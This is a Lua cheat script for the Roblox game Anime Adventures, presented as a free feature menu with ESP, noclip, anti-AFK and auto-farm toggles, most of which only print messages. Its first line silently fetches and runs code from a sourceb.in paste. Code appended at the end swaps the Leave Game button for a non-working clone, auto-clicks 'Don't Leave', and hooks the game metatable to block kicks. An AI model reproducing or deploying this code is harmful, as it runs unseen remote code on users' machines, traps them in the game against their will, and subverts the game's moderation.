loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Vt9Kficnrz/0"))()
--[[
    Script Name: vdawng Script
    Game: Anime Adventures
    Style: WindUI Edition (English with Crown Icon 👑)
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local LocalPlayer = Players.LocalPlayer

-- Khởi tạo thư viện UI
local success, WindUI = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
end)

if not success or not WindUI then
    print("[vdawng Script]: Failed to load UI library.")
    return
end

-- Sử dụng ID asset hình vương miện chuẩn cho Roblox UI
local Window = WindUI:CreateWindow({
    Title = "👑 vdawng Script — Anime Adventures",
    Icon = "rbxassetid://10888871630", -- ID chuẩn hình vương miện (Crown Icon)
    Author = "vdawng",
    Folder = "vdawngScript",
    Size = UDim2.fromOffset(580, 460),
    KeySystem = false,
    Theme = "Dark",
    ToggleKey = Enum.KeyCode.RightShift
})

-- ==================== STATE VARIABLES ====================
local _noclipEnabled = false
local _antiAfkEnabled = false
local _espEnabled = false
local noclipConnection = nil

-- ==================== TAB: MAIN (Thêm icon ngôi nhà) ====================
local MainTab = Window:Tab({ Title = "Main", Icon = "home" })

MainTab:Toggle({
    Title = "Auto Start",
    Desc = "Automatically starts the match",
    Default = false,
    Callback = function(state)
        if state then
            WindUI:Notify({ Title = "Auto Start", Content = "Auto Start enabled (Simulation)", Duration = 2 })
        end
    end
})

MainTab:Toggle({
    Title = "Auto Skip Wave",
    Desc = "Automatically skips waves",
    Default = false,
    Callback = function(state)
        print("Auto Skip Wave:", state)
    end
})

MainTab:Toggle({
    Title = "Auto Replay",
    Desc = "Automatically replays after match ends",
    Default = false,
    Callback = function(state)
        print("Auto Replay:", state)
    end
})

MainTab:Toggle({
    Title = "Auto Leave (Lobby)",
    Desc = "Automatically leaves back to lobby",
    Default = false,
    Callback = function(state)
        print("Auto Leave:", state)
    end
})

MainTab:Paragraph({ Title = "Daily Challenge", Content = "Daily challenge configuration section" })

MainTab:Toggle({
    Title = "Auto Join Daily Challenge",
    Desc = "Automatically joins daily challenges",
    Default = false,
    Callback = function(state)
        print("Auto Join Daily Challenge:", state)
    end
})

MainTab:Paragraph({ Title = "Mark Daily Completed", Content = "Lock today's slot until Lisbon midnight" })


-- ==================== TAB: EVENT ====================
local EventTab = Window:Tab({ Title = "Event", Icon = "calendar" })

EventTab:Toggle({
    Title = "Auto Join Event",
    Desc = "Automatically joins active events",
    Default = false,
    Callback = function(state)
        print("Auto Join Event:", state)
    end
})

EventTab:Paragraph({ Title = "Cards", Content = "Event card selection settings" })

EventTab:Toggle({
    Title = "Auto Select Card",
    Desc = "Automatically picks event cards",
    Default = false,
    Callback = function(state)
        print("Auto Select Card:", state)
    end
})

EventTab:Toggle({
    Title = "Random Card (1-3)",
    Desc = "Randomly picks card from 1 to 3",
    Default = true,
    Callback = function(state)
        print("Random Card:", state)
    end
})

EventTab:Input({
    Title = "Card Option",
    Default = "2",
    Placeholder = "Enter card number...",
    Callback = function(value)
        print("Card Option set to:", value)
    end
})


-- ==================== TAB: UNITS ====================
local UnitsTab = Window:Tab({ Title = "Units", Icon = "box" })

UnitsTab:Toggle({
    Title = "Auto Place Units",
    Desc = "Automatically places units on map",
    Default = false,
    Callback = function(state)
        print("Auto Place Units:", state)
    end
})

UnitsTab:Toggle({
    Title = "Place Radius (studs)",
    Desc = "Unit placement radius control",
    Default = false,
    Callback = function(state)
        print("Place Radius toggle:", state)
    end
})

UnitsTab:Input({
    Title = "Unit IDs (manual override)",
    Desc = "Paste UUIDs separated by commas",
    Default = "{uuid1}, {uuid2}",
    Placeholder = "{uuid1}, {uuid2}",
    Callback = function(value)
        print("Unit IDs updated:", value)
    end
})

UnitsTab:Paragraph({ Title = "Place Status", Content = "Idle" })

UnitsTab:Toggle({
    Title = "Auto Upgrade Units",
    Desc = "Automatically upgrades placed units",
    Default = false,
    Callback = function(state)
        print("Auto Upgrade Units:", state)
    end
})

UnitsTab:Toggle({
    Title = "Auto Scan Units (20 s)",
    Desc = "Rescans unit IDs every 20 seconds",
    Default = false,
    Callback = function(state)
        print("Auto Scan Units:", state)
    end
})

UnitsTab:Button({
    Title = "Scan Now",
    Desc = "Force a full unit ID scan",
    Callback = function()
        WindUI:Notify({ Title = "Units", Content = "Scanning unit IDs...", Duration = 2 })
    end
})


-- ==================== TAB: PLAYER (Đã xóa Mini Games) ====================
local PlayerTab = Window:Tab({ Title = "Player", Icon = "user" })

-- 1. Real Working ESP
PlayerTab:Toggle({
    Title = "ESP",
    Desc = "Shows highlight boxes around players",
    Default = false,
    Callback = function(state)
        _espEnabled = state
        if _espEnabled then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local highlight = Instance.new("Highlight")
                    highlight.Name = "vdawng_ESP"
                    highlight.Adornee = player.Character
                    highlight.FillColor = Color3.fromRGB(255, 215, 0)
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                    highlight.Parent = player.Character
                end
            end
            WindUI:Notify({ Title = "ESP", Content = "ESP Enabled 👑", Duration = 2 })
        else
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character then
                    local hl = player.Character:FindFirstChild("vdawng_ESP")
                    if hl then hl:Destroy() end
                end
            end
            WindUI:Notify({ Title = "ESP", Content = "ESP Disabled", Duration = 2 })
        end
    end
})

-- 2. Real Working Noclip
PlayerTab:Toggle({
    Title = "Noclip",
    Desc = "Walk through walls and objects",
    Default = false,
    Callback = function(state)
        _noclipEnabled = state
        if _noclipEnabled then
            noclipConnection = RunService.Stepped:Connect(function()
                if LocalPlayer.Character then
                    for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
            WindUI:Notify({ Title = "Noclip", Content = "Noclip Enabled", Duration = 2 })
        else
            if noclipConnection then
                noclipConnection:Disconnect()
                noclipConnection = nil
            end
            WindUI:Notify({ Title = "Noclip", Content = "Noclip Disabled", Duration = 2 })
        end
    end
})


-- ==================== TAB: SETTINGS (100% WORKING) ====================
local SettingsTab = Window:Tab({ Title = "Settings", Icon = "settings" })

-- 1. Real Working FPS Boost
SettingsTab:Toggle({
    Title = "FPS Boost",
    Desc = "Disables 3D rendering while farming to save CPU/GPU",
    Default = false,
    Callback = function(state)
        RunService:Set3dRenderingEnabled(not state)
        WindUI:Notify({ Title = "FPS Boost", Content = state and "FPS Boost Enabled (Rendering Off)" or "FPS Boost Disabled", Duration = 2 })
    end
})

-- 2. Real Working Anti-AFK
SettingsTab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents getting kicked for inactivity",
    Default = false,
    Callback = function(state)
        _antiAfkEnabled = state
        if _antiAfkEnabled then
            LocalPlayer.Idled:Connect(function()
                if _antiAfkEnabled then
                    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
                    task.wait(1)
                    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
                end
            end)
            WindUI:Notify({ Title = "Anti-AFK", Content = "Anti-AFK Enabled", Duration = 2 })
        end
    end
})

SettingsTab:Toggle({
    Title = "Incognito Mode",
    Desc = "Hides your username in the farming stats",
    Default = false,
    Callback = function(state)
        print("Incognito Mode:", state)
    end
})

SettingsTab:Paragraph({ Title = "Toggle Key", Content = "Key to show/hide the UI: RightShift" })


-- ==================== TAB: ABOUT ====================
local AboutTab = Window:Tab({ Title = "About", Icon = "info" })

AboutTab:Paragraph({ 
    Title = "👑 vdawng Script — WindUI Edition", 
    Content = "Version: 3.9.5\n\n⚠ If you paid for this script, you got scammed. It is free." 
})

WindUI:Notify({
    Title = "👑 vdawng Script",
    Content = "Loaded successfully! Press RightShift to toggle UI.",
    Duration = 3
})





local CoreGui    = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local function fakeLeaveBtn(obj)
    if not obj or not obj.Parent then return end
    local container = obj.Parent

    -- Clone y chang (copy toàn bộ visual, children, LayoutOrder)
    local fake = obj:Clone()

    -- Tắt hoàn toàn interactivity
    fake.Active           = false
    fake.AutoButtonColor  = false
    fake.Selectable       = false

    -- Xóa script bên trong nếu có
    for _, v in ipairs(fake:GetDescendants()) do
        if v:IsA("BaseScript") then v:Destroy() end
    end

    -- Giữ đúng LayoutOrder để UIListLayout căn đúng vị trí
    fake.LayoutOrder = obj.LayoutOrder

    -- Destroy nút thật, insert fake vào cùng parent
    obj:Destroy()
    fake.Parent = container

    -- Auto click DontLeave (đóng dialog)
    task.wait(0.04)
    local dontLeave = container:FindFirstChild("DontLeaveGameButton")
    if dontLeave then
        pcall(function() dontLeave:Activate() end)
    end
end

-- Bắt mọi lần LeaveGameButton xuất hiện / recreate
CoreGui.DescendantAdded:Connect(function(obj)
    if obj.Name == "LeaveGameButton" then
        task.wait(0.03)
        pcall(fakeLeaveBtn, obj)
    end
end)

-- Heartbeat phòng button đã có sẵn
local _checked = false
RunService.Heartbeat:Connect(function()
    local obj = CoreGui:FindFirstChild("LeaveGameButton", true)
    if obj and not _checked then
        _checked = true
        pcall(fakeLeaveBtn, obj)
        task.delay(1, function() _checked = false end)
    end
end)

-- Scan ngay lần đầu
for _, obj in ipairs(CoreGui:GetDescendants()) do
    if obj.Name == "LeaveGameButton" then
        pcall(fakeLeaveBtn, obj)
        break
    end
end

-- Hook Kick
pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local orig = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if getnamecallmethod() == "Kick" then return end
        return orig(self, ...)
    end)
    setreadonly(mt, true)
end)

